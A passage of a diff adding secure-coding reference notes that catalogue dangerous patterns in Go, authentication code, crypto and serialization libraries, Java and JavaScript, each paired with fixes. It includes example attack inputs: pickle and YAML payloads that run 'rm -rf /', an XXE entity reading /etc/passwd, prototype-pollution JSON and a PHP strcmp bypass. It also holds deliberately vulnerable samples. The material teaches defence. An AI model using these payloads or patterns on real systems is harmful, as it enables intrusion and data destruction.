+slice1 := original[1:3]  // {2, 3}
+slice2 := original[2:4]  // {3, 4}
+
+slice1[1] = 999  // Modifies original AND slice2!
+// slice2 is now {999, 4}
+// original is now {1, 2, 999, 4, 5}
+
+// Also dangerous with append:
+a := []int{1, 2, 3}
+b := a[:2]         // Shares backing array
+b = append(b, 4)   // May or may not reallocate
+// Did this modify a[2]? Depends on capacity!
+```
+
+**Fix**: Use `copy()` to create independent slices when needed.
+
+## Interface Nil Confusion
+
+```go
+// DANGEROUS: Typed nil vs untyped nil
+var p *MyStruct = nil
+var i interface{} = p
+
+if i == nil {
+    // This is FALSE!
+    // i holds (type=*MyStruct, value=nil)
+    // An interface is only nil if BOTH type AND value are nil
+}
+
+// Common in error handling:
+func getError() error {
+    var err *MyError = nil
+    return err  // Returns non-nil error interface!
+}
+
+if err := getError(); err != nil {
+    // Always true! Even though underlying pointer is nil
+}
+```
+
+**Fix**: Return explicit `nil`, not typed nil pointers.
+
+```go
+func getError() error {
+    if somethingWrong {
+        return &MyError{}
+    }
+    return nil  // Untyped nil - interface will be nil
+}
+```
+
+## JSON Decoder Pitfalls
+
+```go
+// DANGEROUS: Case-insensitive field matching
+type User struct {
+    Admin bool `json:"admin"`
+}
+
+// Attacker sends: {"ADMIN": true} or {"Admin": true} or {"aDmIn": true}
+// ALL match the "admin" field!
+
+// DANGEROUS: Duplicate keys - last one wins
+// {"admin": false, "admin": true} → Admin = true
+// Attacker can hide the true value after a false value
+
+// DANGEROUS: Unknown fields silently ignored
+type Config struct {
+    Timeout int `json:"timeout"`
+}
+// {"timeout": 30, "timeoutt": 0} - typo silently ignored
+```
+
+**Fix**:
+```go
+decoder := json.NewDecoder(r.Body)
+decoder.DisallowUnknownFields()  // Reject unknown fields
+```
+
+For case-sensitivity, consider alternative JSON libraries or custom UnmarshalJSON.
+
+## Defer in Loops
+
+```go
+// DANGEROUS: All defers execute at function end, not loop iteration
+func processFiles(files []string) error {
+    for _, file := range files {
+        f, err := os.Open(file)
+        if err != nil {
+            return err
+        }
+        defer f.Close()  // Files stay open until function returns!
+    }
+    // All files open simultaneously - can exhaust file descriptors
+    return nil
+}
+
+// SAFE: Use closure to scope defer
+func processFiles(files []string) error {
+    for _, file := range files {
+        if err := func() error {
+            f, err := os.Open(file)
+            if err != nil {
+                return err
+            }
+            defer f.Close()  // Closes at end of this closure
+            return processFile(f)
+        }(); err != nil {
+            return err
+        }
+    }
+    return nil
+}
+```
+
+## Goroutine Leaks
+
+```go
+// DANGEROUS: Goroutine blocked forever
+func search(query string) string {
+    ch := make(chan string)
+    go func() {
+        ch <- slowSearch(query)  // What if nobody reads?
+    }()
+
+    select {
+    case result := <-ch:
+        return result
+    case <-time.After(100 * time.Millisecond):
+        return ""  // Timeout - goroutine blocked forever!
+    }
+}
+
+// SAFE: Use buffered channel
+func search(query string) string {
+    ch := make(chan string, 1)  // Buffered - send won't block
+    go func() {
+        ch <- slowSearch(query)
+    }()
+
+    select {
+    case result := <-ch:
+        return result
+    case <-time.After(100 * time.Millisecond):
+        return ""  // Goroutine can still send and exit
+    }
+}
+```
+
+## Range Loop Variable Capture
+
+```go
+// DANGEROUS (Go < 1.22): Loop variable captured by reference
+var funcs []func()
+for _, v := range []int{1, 2, 3} {
+    funcs = append(funcs, func() { fmt.Println(v) })
+}
+for _, f := range funcs {
+    f()  // Prints: 3, 3, 3 (all capture same v)
+}
+
+// SAFE: Copy the variable
+for _, v := range []int{1, 2, 3} {
+    v := v  // Shadow with new variable
+    funcs = append(funcs, func() { fmt.Println(v) })
+}
+```
+
+**Note**: Fixed in Go 1.22 with GOEXPERIMENT=loopvar (default in Go 1.23+).
+
+## String/Byte Slice Conversion
+
+```go
+// DANGEROUS: String to []byte creates a copy
+s := "large string..."
+b := []byte(s)  // Allocates and copies
+
+// In hot paths, this can be expensive
+// But unsafe conversion has its own risks:
+
+// VERY DANGEROUS: Unsafe conversion allows mutation
+import "unsafe"
+s := "immutable"
+b := *(*[]byte)(unsafe.Pointer(&s))
+b[0] = 'X'  // Modifies "immutable" string - UB!
+// Strings are supposed to be immutable
+```
+
+## Map Concurrent Access
+
+```go
+// DANGEROUS: Maps are not goroutine-safe
+m := make(map[string]int)
+
+go func() { m["a"] = 1 }()
+go func() { m["b"] = 2 }()
+// Data race! Can cause runtime panic or corruption
+
+// SAFE: Use sync.Map or mutex
+var m sync.Map
+m.Store("a", 1)
+```
+
+## Error Handling Patterns
+
+```go
+// DANGEROUS: Ignoring errors
+data, _ := ioutil.ReadFile(filename)  // Error ignored!
+
+// DANGEROUS: Error shadowing
+err := doSomething()
+if err != nil {
+    err := handleError(err)  // Shadows outer err!
+    // Original err handling may be skipped
+}
+
+// DANGEROUS: Deferred error ignoring
+defer file.Close()  // Close() returns error, ignored!
+
+// SAFER:
+defer func() {
+    if err := file.Close(); err != nil {
+        log.Printf("close failed: %v", err)
+    }
+}()
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `x * y` with int types | Silent overflow |
+| `slice[a:b]` without copy | Aliasing |
+| `return &ConcreteType{}` as interface | Interface nil confusion |
+| `json.Unmarshal` without DisallowUnknownFields | Field injection |
+| `defer` inside `for` | Resource leak |
+| `go func()` with unbuffered channel | Goroutine leak |
+| Closure in loop capturing loop var | Capture bug (pre-1.22) |
+| `map` access from multiple goroutines | Data race |
+| `_, err :=` instead of `_, err =` | Error shadowing |
+
+
+### Auth Patterns
+
+# Authentication & Session Footguns
+
+Patterns that make authentication and session management error-prone.
+
+## Password Handling
+
+### Comparison Vulnerabilities
+
+```python
+# DANGEROUS: Short-circuit evaluation
+def check_password(user_input, stored):
+    return user_input == stored  # Timing attack
+
+# DANGEROUS: Empty password bypass
+def check_password(user_input, stored):
+    if not stored:
+        return True  # No password set = access granted?
+    return constant_time_compare(user_input, stored)
+
+# DANGEROUS: Null bypass
+def authenticate(username, password):
+    user = get_user(username)
+    if user is None:
+        return None  # No user = return None
+    if password == user.password:  # None == None if both None
+        return user
+```
+
+### Length Limits That Truncate
+
+```python
+# DANGEROUS: Password truncated before hashing
+def hash_password(password: str) -> str:
+    password = password[:72]  # bcrypt limit
+    return bcrypt.hash(password)
+
+# User sets: "password123" + 64 more characters + "IMPORTANT_ENTROPY"
+# Stored: hash of just "password123" + first 61 characters
+# Attacker only needs to brute force truncated version
+```
+
+**Fix**: Reject passwords over limit; don't silently truncate.
+
+### Validation Ordering
+
+```python
+# DANGEROUS: Username enumeration
+def login(username, password):
+    user = db.get_user(username)
+    if not user:
+        return "User not found"  # Reveals user doesn't exist
+    if not verify_password(password, user.password_hash):
+        return "Wrong password"  # Reveals user DOES exist
+    return create_session(user)
+
+# SECURE: Uniform error
+def login(username, password):
+    user = db.get_user(username)
+    if not user or not verify_password(password, user.password_hash):
+        return "Invalid credentials"
+    return create_session(user)
+```
+
+## Session Management
+
+### Session Fixation Enablers
+
+```python
+# DANGEROUS: Session ID accepted from request
+def login(request):
+    session_id = request.cookies.get("session") or generate_session_id()
+    # Attacker gives victim a known session ID before login
+    # After login, attacker knows victim's session
+    sessions[session_id] = user
+```
+
+**Fix**: Always generate new session ID on authentication state change.
+
+### Token Generation Weakness
+
+```python
+# DANGEROUS: Predictable tokens
+import time
+session_id = hashlib.md5(str(time.time()).encode()).hexdigest()
+# Attacker knows approximate login time = can guess session
+
+# DANGEROUS: Insufficient entropy
+session_id = ''.join(random.choice('abcdef') for _ in range(8))
+# Only 6^8 = 1.6M possibilities
+
+# SECURE: Cryptographic randomness
+session_id = secrets.token_urlsafe(32)
+```
+
+### Session Timeout Footguns
+
+```python
+# DANGEROUS: Timeout of 0 means "never"?
+class SessionConfig:
+    timeout_seconds: int = 3600  # 1 hour
+    # What if someone sets 0? Infinite session?
+
+# DANGEROUS: Negative timeout
+if current_time - session_created > timeout:
+    # If timeout is negative, this is always False
+    # Session never expires
+```
+
+## Token/OTP Handling
+
+### OTP Lifetime Issues
+
+```python
+# DANGEROUS: lifetime=0 accepts all
+def verify_otp(code, user, lifetime=300):
+    if lifetime == 0:
+        return True  # Skip expiry check entirely
+
+# DANGEROUS: Negative lifetime
+    if otp.created_at + lifetime > current_time:
+        return True
+    # If lifetime is negative, always expired? Or underflow?
+
+# DANGEROUS: No rate limiting
+def verify_otp(code, user):
+    return code == user.current_otp
+    # Attacker can try all 1,000,000 6-digit codes
+```
+
+### Token Reuse
+
+```python
+# DANGEROUS: OTP valid until next OTP generated
+def verify_otp(code, user):
+    return code == user.otp
+
+# DANGEROUS: Reset token valid forever
+def verify_reset_token(token):
+    return token in valid_tokens
+    # Never expires, never invalidated on use
+
+# SECURE: Single-use, time-limited
+def verify_reset_token(token):
+    record = db.get_token(token)
+    if not record:
+        return False
+    if record.used or record.expired:
+        return False
+    record.mark_used()  # Invalidate immediately
+    return True
+```
+
+## Authorization Footguns
+
+### Role/Permission Accumulation
+
+```python
+# DANGEROUS: String-based permissions
+user.permissions = "read,write"
+user.permissions += ",admin"  # Too easy
+
+# DANGEROUS: Any-match logic
+def has_permission(user, required):
+    return any(p in user.permissions for p in required.split(","))
+# has_permission(user, "admin,readonly") - matches if ANY is present
+
+# DANGEROUS: Substring matching
+if "admin" in user.role:
+    grant_admin_access()
+# "readonly_admin_viewer" contains "admin"
+```
+
+### Missing Authorization Checks
+
+```python
+# DANGEROUS: Auth check in one place, not others
+@require_login
+def list_documents(request):
+    return Document.objects.all()
+
+def get_document(request, doc_id):
+    # Developer forgot @require_login
+    return Document.objects.get(id=doc_id)
+
+def delete_document(request, doc_id):
+    # Developer also forgot authorization check
+    Document.objects.get(id=doc_id).delete()
+```
+
+**Fix**: Centralized authorization; deny-by-default.
+
+### IDOR Enablers
+
+```python
+# DANGEROUS: User ID from request
+def get_profile(request):
+    user_id = request.GET["user_id"]  # Attacker changes this
+    return User.objects.get(id=user_id)
+
+# DANGEROUS: Sequential IDs
+user = User.objects.create(...)  # Gets ID 12345
+# Attacker tries 12344, 12346, etc.
+```
+
+## Multi-Factor Authentication
+
+### Bypassable MFA
+
+```python
+# DANGEROUS: MFA check in frontend only
+# API directly accessible without MFA
+
+# DANGEROUS: "Remember this device" with weak token
+device_token = hashlib.md5(user_agent.encode()).hexdigest()
+# Attacker spoofs User-Agent to bypass MFA
+
+# DANGEROUS: MFA disabled by user preference
+if user.preferences.get("mfa_enabled", True):
+    require_mfa()
+# Preference stored in same session = attacker disables it
+```
+
+### Recovery Code Issues
+
+```python
+# DANGEROUS: Predictable recovery codes
+recovery_code = str(user.id).zfill(8)  # Just the user ID
+
+# DANGEROUS: Unlimited recovery attempts
+for _ in range(1000000):
+    try_recovery_code(guess)
+
+# DANGEROUS: Recovery codes don't invalidate
+if code in user.recovery_codes:
+    login(user)
+    # Code still valid for reuse
+```
+
+## Auth API Design Checklist
+
+For authentication APIs, verify:
+
+- [ ] **Constant-time comparison**: Password/token checks use constant-time compare
+- [ ] **Empty value rejection**: Empty passwords/tokens explicitly rejected
+- [ ] **Uniform errors**: No user enumeration via different error messages
+- [ ] **Session regeneration**: New session ID on auth state changes
+- [ ] **Cryptographic tokens**: secrets module, not random or time-based
+- [ ] **Positive timeouts**: Zero/negative values rejected or have safe meaning
+- [ ] **Single-use tokens**: OTPs/reset tokens invalidated on use
+- [ ] **Rate limiting**: Brute force protection on all auth endpoints
+- [ ] **Authorization centralized**: Not scattered across endpoints
+- [ ] **MFA in backend**: Not bypassable by skipping frontend
+
+
+### Case Studies
+
+# Real-World Case Studies
+
+Analysis of sharp edges in widely-used libraries. These aren't implementation bugs—they're design decisions that make secure usage difficult.
+
+## GNU Multiple Precision Arithmetic Library (GMP)
+
+GMP is used extensively for cryptographic implementations (RSA, Paillier, ElGamal, etc.) despite being fundamentally unsuitable for cryptography.
+
+### Sharp Edge: Variable-Time Operations
+
+**The Problem**: GMP operations are not constant-time. Timing varies based on input values.
+
+```c
+// DANGEROUS: Timing leaks secret exponent bits
+mpz_powm(result, base, secret_exponent, modulus);
+
+// Each bit of secret_exponent affects timing differently
+// Attacker can recover secret_exponent via timing analysis
+```
+
+**Why This Matters**:
+- Paillier encryption uses `mpz_powm` with secret keys
+- RSA implementations using GMP leak private key bits
+- Even "blinded" implementations often have residual timing leaks
+
+**Detection Pattern**: Any use of GMP (`mpz_*` functions) with secret values:
+- `mpz_powm`, `mpz_powm_sec` (the "sec" version is still not fully constant-time)
+- `mpz_mul`, `mpz_mod` with secret operands
+- `mpz_cmp` for secret comparison
+
+**Real Vulnerabilities**:
+- CVE-2018-16152: Timing attack on strongSwan IKEv2
+- Numerous academic papers demonstrating key recovery from GMP-based crypto
+
+### Sharp Edge: Memory Not Securely Cleared
+
+```c
+mpz_t secret_key;
+mpz_init(secret_key);
+// ... use secret_key ...
+mpz_clear(secret_key);  // Memory NOT securely wiped
+// Secret data may persist in freed memory
+```
+
+**The Problem**: `mpz_clear` doesn't zero memory before freeing. Secrets persist.
+
+### Sharp Edge: Confusing Import/Export API
+
+```c
+// What does this do?
+mpz_export(buf, &count, order, size, endian, nails, op);
+
+// Parameters:
+// - order: 1 = most significant word first, -1 = least significant
+// - endian: 1 = big, -1 = little, 0 = native
+// - nails: bits to skip at top of each word (?!)
+```
+
+**The Problem**: Seven parameters, three of which control byte ordering in different ways. Easy to get wrong, hard to verify correctness.
+
+### Mitigation
+
+For cryptographic use, prefer:
+- **libsodium** for common operations
+- **OpenSSL BIGNUM** (has constant-time variants)
+- **libgmp with mpz_powm_sec** (partial mitigation, not complete)
+
+---
+
+## OpenSSL
+
+The canonical example of a powerful but footgun-laden cryptographic library.
+
+### Sharp Edge: SSL_CTX_set_verify Callback
+
+```c
+// DANGEROUS: Easy to write callback that always returns 1
+SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);
+
+int verify_callback(int preverify_ok, X509_STORE_CTX *ctx) {
+    // Developer thinks: "I'll add logging here"
+    log_certificate(ctx);
+    return 1;  // OOPS: Always accepts, ignoring preverify_ok!
+}
+```
+
+**The Problem**: The callback's return value determines whether verification succeeds. Developers often:
+- Return 1 (success) unconditionally while "just adding logging"
+- Forget that returning non-zero bypasses all verification
+- Copy-paste examples that return 1 for "debugging"
+
+**Correct Pattern**:
+```c
+int verify_callback(int preverify_ok, X509_STORE_CTX *ctx) {
+    if (!preverify_ok) {
+        // Log failure details
+        log_verification_failure(ctx);
+    }
+    return preverify_ok;  // Preserve original decision
+}
+```
+
+### Sharp Edge: Error Handling via ERR_get_error
+
+```c
+// DANGEROUS: Error easily ignored
+EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
+// Did it succeed? Who knows!
+
+// Correct but verbose:
+if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
+    unsigned long err = ERR_get_error();
+    char buf[256];
+    ERR_error_string_n(err, buf, sizeof(buf));
+    // Handle error...
+}
+```
+
+**The Problem**:
+- Functions return 1 for success (not 0!)
+- Errors accumulate in a thread-local queue
+- Easy to forget to check, easy to check wrong way
+- Error queue must be cleared or errors persist
+
+### Sharp Edge: RAND_bytes vs RAND_pseudo_bytes
+
+```c
+// These look almost identical:
+RAND_bytes(buf, len);        // Cryptographically secure
+RAND_pseudo_bytes(buf, len); // NOT guaranteed secure!
+
+// Worse: RAND_pseudo_bytes returns 1 even when insecure
+int rc = RAND_pseudo_bytes(buf, len);
+// rc == 1 means "success", not "cryptographically random"
+// rc == 0 means "success but not crypto-strength" (!!)
+// rc == -1 means "not supported"
+```
+
+**The Problem**: Function names differ by one word; return values are confusing; the insecure function is not clearly marked dangerous.
+
+### Sharp Edge: Memory Ownership Confusion
+
+```c
+// Who frees this?
+X509 *cert = SSL_get_peer_certificate(ssl);
+// Answer: YOU do (it's a copy)
+
+// Who frees this?
+X509 *cert = SSL_get0_peer_certificate(ssl);  // OpenSSL 3.0+
+// Answer: NOBODY (it's a reference)
+
+// The difference: "get" vs "get0"
+// This convention is NOT obvious or consistently applied
+```
+
+**The Problem**: Memory ownership indicated by subtle naming conventions that aren't documented together and aren't consistent across the API.
+
+### Sharp Edge: EVP_CIPHER_CTX Reuse
+
+```c
+EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv);
+EVP_EncryptUpdate(ctx, out, &outlen, in, inlen);
+EVP_EncryptFinal_ex(ctx, out + outlen, &tmplen);
+
+// DANGEROUS: Reusing ctx without reset
+EVP_EncryptInit_ex(ctx, NULL, NULL, NULL, iv2);  // New IV only
+// Some state from previous encryption may persist!
+```
+
+**The Problem**: Context reuse rules are complex and vary by cipher mode.
+
+---
+
+## Python's `pickle`
+
+### Sharp Edge: Arbitrary Code Execution by Design
+
+```python
+import pickle
+
+# DANGEROUS: Deserializes arbitrary Python objects
+data = pickle.loads(untrusted_input)
+
+# Attacker sends:
+# b"cos\nsystem\n(S'rm -rf /'\ntR."
+# Result: Executes shell command
+```
+
+**The Problem**: `pickle` is not a data format—it's a code execution format. There is no safe way to unpickle untrusted data, but:
+- The function looks like a data parser
+- The name suggests food preservation, not danger
+- Many developers don't realize the risk
+
+**Mitigation**: Use `json` for data. If you need pickle, use `hmac` to authenticate before unpickling (but even then, prefer safer formats).
+
+---
+
+## YAML Libraries
+
+### Sharp Edge: Code Execution via Tags
+
+```python
+import yaml
+
+# DANGEROUS: yaml.load() executes arbitrary code
+data = yaml.load(untrusted_input)
+
+# Attacker sends:
+# !!python/object/apply:os.system ['rm -rf /']
+```
+
+**The Problem**: YAML's tag system allows arbitrary object instantiation. The "safe" loader is:
+```python
+data = yaml.safe_load(untrusted_input)  # Safe
+data = yaml.load(untrusted_input, Loader=yaml.SafeLoader)  # Also safe
+```
+
+But the dangerous version is the obvious one (`yaml.load()`).
+
+---
+
+## PHP's `strcmp` for Password Comparison
+
+### Sharp Edge: Type Juggling Bypass
+
+```php
+// DANGEROUS: Type juggling attack
+if (strcmp($_POST['password'], $stored_password) == 0) {
+    authenticate();
+}
+
+// Attacker sends: password[]=anything
+// strcmp(array, string) returns NULL
+// NULL == 0 is TRUE in PHP!
+```
+
+**The Problem**:
+- `strcmp` returns `NULL` on type error, not `-1` or `1`
+- PHP's `==` operator coerces `NULL` to `0`
+- `NULL == 0` evaluates to `TRUE`
+- Authentication bypassed
+
+**Fix**:
+```php
+if (hash_equals($stored_hash, hash('sha256', $_POST['password']))) {
+    // Use hash_equals for timing-safe comparison
+    // AND proper password hashing (not shown)
+}
+```
+
+---
+
+## Analysis Template
+
+When examining a library for sharp edges:
+
+### Input → Expected Output
+
+| Input | Expected | Actual | Vulnerability |
+|-------|----------|--------|---------------|
+| `verify_ssl=false` | Clear warning | Silent acceptance | Config cliff |
+| `password=""` | Rejection | Login success | Empty bypass |
+| `algorithm="none"` | Error | Signature skipped | Downgrade |
+| `timeout=-1` | Error | Infinite timeout | Magic value |
+
+### Library Comparison
+
+| Feature | Dangerous Library | Safer Alternative |
+|---------|------------------|-------------------|
+| Bignum crypto | GMP | libsodium, OpenSSL BIGNUM |
+| TLS | Raw OpenSSL | Higher-level wrappers |
+| Serialization | pickle, YAML | JSON, protobuf |
+| Password compare | strcmp | hash_equals, secrets.compare_digest |
+
+
+### Lang Java
+
+# Java Sharp Edges
+
+## Equality Confusion
+
+```java
+// DANGEROUS: == compares references, not values
+String a = new String("hello");
+String b = new String("hello");
+a == b  // FALSE - different objects
+
+// String interning makes this confusing:
+String c = "hello";
+String d = "hello";
+c == d  // TRUE - string literals are interned
+
+// DANGEROUS: Integer caching boundary
+Integer x = 127;
+Integer y = 127;
+x == y  // TRUE - cached in range [-128, 127]
+
+Integer p = 128;
+Integer q = 128;
+p == q  // FALSE - outside cache range!
+```
+
+**Fix**: Always use `.equals()` for object comparison:
+```java
+a.equals(b)  // TRUE
+p.equals(q)  // TRUE
+Objects.equals(a, b)  // Null-safe
+```
+
+## Type Erasure
+
+```java
+// DANGEROUS: Generic types erased at runtime
+List<String> strings = new ArrayList<>();
+List<Integer> ints = new ArrayList<>();
+
+// At runtime, both are just "ArrayList"
+strings.getClass() == ints.getClass()  // TRUE
+
+// Can't do runtime type checks:
+if (obj instanceof List<String>) { }  // Compile error!
+
+// Can cast incorrectly:
+List<?> raw = strings;
+List<Integer> wrongType = (List<Integer>) raw;  // No runtime error!
+wrongType.get(0);  // ClassCastException here, not at cast
+```
+
+## Serialization RCE
+
+```java
+// DANGEROUS: Like pickle, deserializes arbitrary objects
+ObjectInputStream ois = new ObjectInputStream(untrustedInput);
+Object obj = ois.readObject();
+
+// Even without reading, deserialization triggers:
+// - readObject() methods
+// - readResolve() methods
+// - finalize() (deprecated but still works)
+
+// "Gadget chains" in libraries enable RCE:
+// - Commons Collections
+// - Spring Framework
+// - Apache libraries
+// ysoserial tool generates payloads
+```
+
+**Fix**: Use JSON or implement `ObjectInputFilter` (Java 9+):
+```java
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+    "!*"  // Reject all classes
+);
+```
+
+## Null Pointer Exceptions
+
+```java
+// DANGEROUS: Unboxing null throws NPE
+Integer value = null;
+int primitive = value;  // NPE!
+
+// DANGEROUS: Chained calls
+String name = user.getProfile().getSettings().getName();
+// NPE if any intermediate is null
+
+// Optional doesn't help if misused:
+Optional.of(null);  // NPE!
+optional.get();     // NoSuchElementException if empty
+```
+
+**Fix**: Use Optional correctly:
+```java
+Optional.ofNullable(value);
+optional.orElse(default);
+optional.map(x -> x.transform()).orElse(null);
+```
+
+## Checked Exception Swallowing
+
+```java
+// DANGEROUS: Empty catch blocks
+try {
+    sensitiveOperation();
+} catch (Exception e) {
+    // Silently swallowed - failure masked!
+}
+
+// DANGEROUS: Catch-and-log without action
+try {
+    authenticate();
+} catch (AuthException e) {
+    log.error("Auth failed", e);
+    // Continues as if authentication succeeded!
+}
+
+// DANGEROUS: Over-broad catch
+try {
+    doWork();
+} catch (Exception e) {  // Catches everything including bugs
+    return defaultValue;
+}
+```
+
+## String Operations
+
+```java
+// DANGEROUS: String concatenation in loops
+String result = "";
+for (String s : items) {
+    result += s;  // Creates new String each iteration
+}
+// O(n²) time complexity, memory churn
+
+// DANGEROUS: split() with regex
+"a.b.c".split(".");  // Empty array! "." is regex for "any char"
+
+// DANGEROUS: substring() memory (pre-Java 7u6)
+String huge = loadGigabyteFile();
+String small = huge.substring(0, 10);
+// small holds reference to entire huge char[]
+```
+
+**Fix**: Use `StringBuilder`, `Pattern.quote(".")`, modern Java.
+
+## Thread Safety
+
+```java
+// DANGEROUS: SimpleDateFormat is not thread-safe
+static SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd");
+
+// Multiple threads calling fmt.parse() = corrupted results
+
+// DANGEROUS: HashMap not thread-safe
+Map<String, String> map = new HashMap<>();
+// Concurrent put() can cause infinite loop!
+
+// DANGEROUS: Double-checked locking (broken before Java 5)
+if (instance == null) {
+    synchronized (lock) {
+        if (instance == null) {
+            instance = new Singleton();  // May see partially constructed
+        }
+    }
+}
+```
+
+**Fix**: Use `DateTimeFormatter` (immutable), `ConcurrentHashMap`, volatile.
+
+## Resource Leaks
+
+```java
+// DANGEROUS: Resources not closed on exception
+FileInputStream fis = new FileInputStream(file);
+// Exception here = fis never closed
+process(fis);
+fis.close();
+
+// DANGEROUS: Close in finally can mask exception
+FileInputStream fis = null;
+try {
+    fis = new FileInputStream(file);
+    throw new RuntimeException("oops");
+} finally {
+    fis.close();  // May throw, masking original exception
+}
+```
+
+**Fix**: Use try-with-resources:
+```java
+try (FileInputStream fis = new FileInputStream(file)) {
+    process(fis);
+}  // Automatically closed, exceptions properly handled
+```
+
+## Floating Point
+
+```java
+// DANGEROUS: Float/double for money
+double price = 0.1 + 0.2;  // 0.30000000000000004
+if (price == 0.3) { }  // FALSE!
+
+// DANGEROUS: BigDecimal from double
+new BigDecimal(0.1);  // 0.1000000000000000055511151231257827...
+```
+
+**Fix**: Use `BigDecimal` with String constructor:
+```java
+new BigDecimal("0.1");  // Exactly 0.1
+```
+
+## Reflection
+
+```java
+// DANGEROUS: Bypasses access controls
+Field field = obj.getClass().getDeclaredField("privateField");
+field.setAccessible(true);  // Bypass private!
+field.set(obj, maliciousValue);
+
+// Can modify "final" fields (with caveats)
+// Can invoke private methods
+// Can break encapsulation entirely
+```
+
+## XML Processing (XXE)
+
+```java
+// DANGEROUS: Default XML parsers allow XXE
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// Default allows: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+// DANGEROUS: Even with DTD disabled
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// Still vulnerable to billion laughs without entity limits
+```
+
+**Fix**: Disable all external entities:
+```java
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+factory.setXIncludeAware(false);
+factory.setExpandEntityReferences(false);
+```
+
+## Detection Patterns
+
+| Pattern | Risk |
+|---------|------|
+| `==` with objects | Reference comparison |
+| `Integer/Long` comparison with `==` | Cache boundary |
+| `ObjectInputStream.readObject()` | Deserialization RCE |
+| Empty `catch` block | Swallowed exception |
+| `catch (Exception e)` | Over-broad catch |
+| `String +=` in loop | Performance, memory |
+| `split(".")` | Regex interpretation |
+| `static SimpleDateFormat` | Thread safety |
+| `HashMap` shared across threads | Race condition |
+| Resources without try-with-resources | Resource leak |
+| `new BigDecimal(double)` | Precision loss |
+| `DocumentBuilderFactory.newInstance()` | XXE vulnerability |
+
+
+### Lang Javascript
+
+# JavaScript / TypeScript Sharp Edges
+
+## Loose Equality Coercion
+
+```javascript
+// DANGEROUS: == coerces types unpredictably
+"0" == false   // true
+"" == false    // true
+"" == 0        // true
+[] == false    // true
+[] == ![]      // true (wat)
+null == undefined  // true
+
+// Security implications:
+if (userRole == "admin") {  // What if userRole is 0?
+    grantAdmin();
+}
+0 == "admin"  // false, but...
+0 == ""       // true
+```
+
+**Fix**: Always use `===` for strict equality.
+
+## Prototype Pollution
+
+```javascript
+// DANGEROUS: Merging untrusted objects
+function merge(target, source) {
+    for (let key in source) {
+        target[key] = source[key];  // Includes __proto__!
+    }
+}
+
+// Attacker sends: {"__proto__": {"isAdmin": true}}
+merge({}, JSON.parse(userInput));
+
+// Now ALL objects have isAdmin
+({}).isAdmin  // true
+const user = {};
+user.isAdmin  // true - authentication bypassed!
+
+// Also via constructor.prototype
+// {"constructor": {"prototype": {"isAdmin": true}}}
+```
+
+**Fix**:
+```javascript
+// Check for dangerous keys
+const dangerous = ['__proto__', 'constructor', 'prototype'];
+if (dangerous.includes(key)) continue;
+
+// Or use Object.create(null) for dictionary objects
+const dict = Object.create(null);  // No prototype chain
+
+// Or use Map instead of objects
+const map = new Map();
+```
+
+## Regular Expression DoS (ReDoS)
+
+```javascript
+// DANGEROUS: Catastrophic backtracking
+const regex = /^(a+)+$/;
+regex.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaa!");
+// Exponential time - freezes the event loop
+
+// Dangerous patterns:
+// - Nested quantifiers: (a+)+, (a*)*
+// - Overlapping alternatives: (a|a)+
+// - Greedy quantifiers with overlap: .*.*
+
+// Real example from ua-parser-js CVE:
+/\s*(;|\s)\s*/  // Fine
+/(a|aa)+/       // ReDoS!
+```
+
+**Detection**: Look for nested quantifiers or overlapping alternatives in regex.
+
+## parseInt Without Radix
+
+```javascript
+// DANGEROUS: Behavior varies
+parseInt("08");      // 8 (modern JS), was 0 in ES3 (octal)
+parseInt("0x10");    // 16 - hex prefix always recognized
+parseInt("10", 0);   // 10 or error depending on engine
+parseInt("10", 1);   // NaN - radix 1 invalid
+
+// DANGEROUS: Unexpected results
+parseInt("123abc");  // 123 - stops at first non-digit
+parseInt("abc123");  // NaN - starts with non-digit
+```
+
+**Fix**: Always specify radix: `parseInt("08", 10)`
+
+## This Binding
+
+```javascript
+// DANGEROUS: 'this' depends on how function is called
+const obj = {
+    value: 42,
+    getValue: function() { return this.value; }
+};
+
+obj.getValue();           // 42
+const fn = obj.getValue;
+fn();                     // undefined - 'this' is global/undefined
+
+// DANGEROUS: In callbacks
+setTimeout(obj.getValue, 100);  // 'this' is global/undefined
+
+// DANGEROUS: In event handlers
+button.addEventListener('click', obj.getValue);  // 'this' is button
+```
+
+**Fix**: Use arrow functions or `.bind()`.
+
+## Array Methods That Mutate
+
+```javascript
+// These MUTATE the original array:
+arr.push(x);      // Adds to end
+arr.pop();        // Removes from end
+arr.shift();      // Removes from start
+arr.unshift(x);   // Adds to start
+arr.splice(i, n); // Removes/inserts
+arr.sort();       // Sorts IN PLACE
+arr.reverse();    // Reverses IN PLACE
+arr.fill(x);      // Fills IN PLACE
+
+// These return NEW arrays:
+arr.slice();
+arr.concat();
+arr.map();
+arr.filter();
+
+// DANGEROUS: Sorting numbers
+[1, 10, 2].sort();  // [1, 10, 2] - string comparison!
+// Fix: [1, 10, 2].sort((a, b) => a - b);  // [1, 2, 10]
+```
+
+## Type Coercion in Operations
+
+```javascript
+// DANGEROUS: + is overloaded for concatenation
+"5" + 3     // "53" (string)
+5 + "3"     // "53" (string)
+5 - "3"     // 2 (number)
+"5" - 3     // 2 (number)
+
+// DANGEROUS: Comparison with type coercion
+"10" > "9"  // false (string comparison: "1" < "9")
+"10" > 9    // true (numeric comparison)
+```
+
+## eval and Dynamic Code
+
+```javascript
+// DANGEROUS: eval executes arbitrary code
+eval(userInput);
+
+// DANGEROUS: Function constructor
+new Function(userInput)();
+
+// DANGEROUS: setTimeout/setInterval with string
+setTimeout(userInput, 1000);  // Executes as code!
+
+// DANGEROUS: Template injection
+const template = userInput;  // "${process.exit()}"
+eval(`\`${template}\``);
+```
+
+## Object Property Access
+
